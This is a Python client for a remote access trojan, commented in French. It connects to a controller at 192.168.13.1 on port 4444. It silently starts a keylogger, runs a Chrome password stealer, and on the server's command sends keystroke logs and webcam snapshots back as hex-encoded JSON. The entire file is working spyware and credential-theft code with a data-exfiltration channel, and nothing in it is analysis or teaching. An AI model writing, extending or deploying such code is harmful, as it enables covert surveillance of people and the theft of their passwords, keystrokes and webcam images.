import subprocess
import socket
import json
import threading
import os
import sys
import time

SERVER_IP = "192.168.13.1"
SERVER_PORT = 4444

if getattr(sys, 'frozen', False):
    BASE_DIR = os.path.dirname(sys.executable)
else:
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))

KEYLOGGER_EXE = os.path.join(BASE_DIR, "keylogger.exe")
PASSWORD_EXE = os.path.join(BASE_DIR, "chrome_password.exe")
WEBCAM_EXE = os.path.join(BASE_DIR, "web_cam.exe")
KEYLOG_FILE = os.path.join(BASE_DIR, "keylogs.txt")
WEBCAM_FILE = os.path.join(BASE_DIR, "webcam_capture.jpg")

def send_file(client_socket, file_path, file_type):
    try:
        if not os.path.exists(file_path):
            print(f"[-] Fichier non trouvé : {file_path}")
            return

        with open(file_path, "rb") as file:
            file_data = file.read()

        payload = json.dumps({
            "type": file_type,
            "filename": os.path.basename(file_path),
            "data": file_data.hex()
        })
        client_socket.send(payload.encode('utf-8'))
        print(f"[+] Fichier '{file_path}' envoyé au serveur.")
    except Exception as e:
        print(f"[Erreur] lors de l'envoi : {e}")

def wait_for_file(file_path, timeout=10):
    """Attente que le fichier soit généré (jusqu'à 10 secondes)."""
    start_time = time.time()
    while not os.path.exists(file_path):
        if time.time() - start_time > timeout:
            print(f"[-] Temps d'attente dépassé pour le fichier : {file_path}")
            return False
        time.sleep(1)
    return True

def handle_commands(client_socket):
    try:
        while True:
            command = client_socket.recv(1024).decode('utf-8')

            if command == "keylogger":
                if wait_for_file(KEYLOG_FILE):
                    send_file(client_socket, KEYLOG_FILE, "keystroke")
                else:
                    print(f"[-] Le fichier keylogger est introuvable après l'attente.")

            elif command == "webcam":
                subprocess.run([WEBCAM_EXE], check=True)
                if wait_for_file(WEBCAM_FILE):
                    send_file(client_socket, WEBCAM_FILE, "webcam_capture")
                else:
                    print(f"[-] Le fichier de la webcam est introuvable après l'attente.")
    except Exception as e:
        print(f"[Erreur] de connexion : {e}")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))

        # Lancer le keylogger et le password grabber
        subprocess.Popen([KEYLOGGER_EXE], creationflags=subprocess.CREATE_NO_WINDOW)
        subprocess.run([PASSWORD_EXE], check=True)

        # Gérer les commandes serveur
        handle_commands(s)

if __name__ == "__main__":
    main()
